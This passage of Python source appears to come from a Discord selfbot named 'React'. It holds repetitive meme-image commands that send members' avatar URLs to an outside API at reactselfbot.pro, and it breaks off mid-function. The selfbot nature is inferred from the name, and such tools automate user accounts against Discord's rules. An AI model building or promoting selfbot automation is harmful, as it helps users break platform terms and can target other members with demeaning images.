            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="batslap <Member>", description="Generates a batslap image with the member's profile picture")
    async def batslap(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Bat Slap',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=batslap&url={str(user.avatar_url).replace(".webp", ".png")}&avatar={str(ctx.author.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="beautiful <Member>", description="Generates a beautiful image with the member's profile picture")
    async def beautiful(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Beautiful',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=beautiful&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="ps4 <User>", description="PS4 Cover")
    async def ps4(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'PS4',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=ps4&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="glitch <User>", description="Glitch effect")
    async def glitch(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Glitch',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=glitch&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="moustache <User>", description="Moustache over avatar")
    async def moustache(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Moustache',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=moustache&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="jail <User>", description="Jail meme (BROKEN!)")
    async def jail(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Jail',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=jail&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="challenger <User>", description="Challenger approaching")
    async def challenger(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Challenger',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=challenger&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="_3000years <User>", description="3000 years meme")
    async def _3000years(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'3000 years',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=3000years&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="dungeon <User>", description="Dungeon meme")
    async def dungeon(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Dungeon',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=ddungeon&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="thanos <User>", description="Thanos effect")
    async def thanos(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Thanos',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=thanos&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="brazzers <Member>", description="Generates a brazzers image with the member's profile picture")
    async def brazzers(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Brazzers',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=brazzers&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="burn <Member>", description="Generates a burn image with the member's profile picture")
    async def burn(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Burn',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=burn&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="crush <Member>", description="Generates a crush image with the member's profile picture")
    async def crush(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Crush',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=crush&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="dictator <Member>", description="Generates a dictator image with the member's profile picture")
    async def dictator(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Dictator',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=dictator&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="discordhouse <Bravery, Brilliance, Balance> <Member>", description="Generates a discordhouse image with the member's profile picture")
    async def discordhouse(ctx, house: str, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Discord House',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=discordhouse&url={str(user.avatar_url).replace(".webp", ".png")}&house={house}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="gay <Member>", description="Generates a gay image with the member's profile picture")
    async def gay(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Gay',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=gay&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="magik <Member>", description="Generates a magik image with the member's profile picture")
    async def magik(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Magik',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=magik&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="missionpassed <Member>", description="Generates a missionpassed image with the member's profile picture")
    async def missionpassed(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Mission Passed',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=missionpassed&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="rejected <Member>", description="Generates a rejected image with the member's profile picture")
    async def rejected(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rejected',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=rejected&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
    
    @React.command(usage="rip <Member>", description="Generates a rip image with the member's profile picture")
    async def rip(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'RIP',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=rip&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="scary <Member>", description="Generates a scary image with the member's profile picture")
    async def scary(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Scary',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=scary&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="sniper <Member>", description="Generates a sniper image with the member's profile picture")
    async def sniper(ctx, user: discord.User):
        try:
            embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Sniper',timestamp=embed_timestamp())
            request = requests.get(f'https://reactselfbot.pro/api/generation.php?type=sniper&url={str(user.avatar_url).replace(".webp", ".png")}').json()['url']
            embed.set_image(url=f'{request}')
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
